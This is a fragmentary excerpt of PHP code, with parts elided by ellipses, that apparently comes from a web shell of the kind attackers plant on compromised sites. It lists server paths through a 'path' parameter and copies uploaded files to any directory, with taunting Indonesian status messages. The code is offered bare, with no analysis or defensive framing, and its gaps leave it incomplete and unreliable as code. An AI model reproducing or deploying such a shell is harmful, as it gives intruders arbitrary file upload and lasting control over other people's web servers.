$value){ $_POST[$key] = stripslashes($value);
} } echo '
<!DOCTYPE HTML>
<html>
<head>
                      ...
                      echo '<a href="?path=';
                       ...
                       $i++){ echo "$paths[$i]";
                        if($i != $id) echo "/";
                         ...
                         if(isset($_FILES['file'])){ if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){ echo '<font color="green">SILAHKAN UPLOAD STAH:V</font><br />';
                         }else{ echo '<font color="green">UPLOAD GAGAL ANJING COBA LAGI!!</font><br/>';
